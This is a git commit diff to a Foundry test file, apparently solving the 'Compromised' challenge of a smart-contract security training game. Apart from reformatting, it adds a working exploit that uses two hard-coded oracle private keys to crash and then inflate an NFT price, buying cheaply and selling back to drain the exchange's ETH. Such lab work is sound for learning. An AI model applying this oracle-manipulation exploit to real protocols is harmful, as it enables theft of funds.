0b250d068434b2f799f576b913242241bff78085
qbinchi <jakubdawid@protonmail.com>
2026-06-23 17:04:10 +0200

    compromised solved

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -20,14 +20,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +53,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +81,39 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address oracle1 = vm.addr(pk1);
+        address oracle2 = vm.addr(pk2);
+
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.startPrank(player);
+        uint256 tokenId = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        uint256 exchangeBalance = address(exchange).balance;
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", exchangeBalance);
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", exchangeBalance);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        vm.prank(oracle1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(oracle2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(player);
+        payable(recovery).transfer(exchangeBalance);
     }
 
     /**
